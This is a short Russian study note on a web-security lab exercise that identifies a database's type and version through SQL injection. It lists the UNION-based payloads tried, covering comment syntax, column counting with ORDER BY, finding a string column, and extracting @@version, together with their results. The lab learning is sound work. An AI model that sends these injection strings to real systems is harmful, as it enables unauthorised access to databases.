# определение типа бд

# querying the database type and version on MySQL and Microsoft

сразу заметил полезный опыт

'+--+ работает

'+--  не работает


'order+by+2+--+   понял что 2 столбца

'union+select+null,null+--+  200

'union+select+'fff333',null+--+  первый строковый!

пробелы
```c
### `%20`

- URL-кодирование пробела (ASCII 0x20)
    
- Работает **везде** в URL (в пути, в параметрах, в query string)
    
- Пример: `/filter?category=Gifts%20and%20Toys`
    

### `+`

- Тоже пробел, но **только в query string** (после `?`)
    
- Это legacy-способ из старых спецификаций HTML forms
    
- Пример: `/filter?category=Gifts+and+Toys`
```


<img src="../../assets/Снимок-20.07.37.png" alt="Скрин" style="width: 90%; " />



```sql
'union+select+@@version,null+--+   ответ   8.0.42-0ubuntu0.20.04.1
'union+all+select+@@version,null+--+     ответ   8.0.42-0ubuntu0.20.04.1
```

==выполнено==

из решения вижу то есть тут +--+ заменяется  #
'+UNION+SELECT+@@version,+NULL#   

ответ  8.0.42-0ubuntu0.20.04.1

